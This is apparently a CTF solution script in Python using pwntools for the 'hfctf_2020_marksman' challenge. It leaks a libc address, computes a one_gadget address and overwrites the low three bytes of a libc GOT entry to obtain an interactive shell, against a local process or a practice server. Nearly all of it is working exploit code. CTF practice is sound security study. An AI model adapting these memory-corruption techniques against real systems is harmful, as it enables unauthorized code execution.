# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './hfctf_2020_marksman'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    #libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25988'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a = "\n"   : int( p.recvuntil(a,drop = True),16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    while 1 :
        try:
            pwn()
        except:
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

#one_gad = one_gadget(libc.path)

ru("placed the target near: 0x")
puts_addr = rint()
lg("puts_addr",puts_addr)

libc_base = puts_addr - libc.sym["puts"]
one_gadget = libc_base + 0xe585f
target = libc_base + 0x3eb0a8

lg("one_gadget",one_gadget)

# libc没全开，打libc的got表
sla("shoot!shoot!\n",str(target ) + "\n")

# 修改低三字节
sla('biang!\n', p64(one_gadget)[0])
sla('biang!\n', p64(one_gadget)[1])
sla('biang!\n', p64(one_gadget)[2])


p.interactive()

'''
@File    :   hfctf_2020_marksman.py
@Time    :   2021/08/16 13:10:03
@Author  :   Niyah 
'''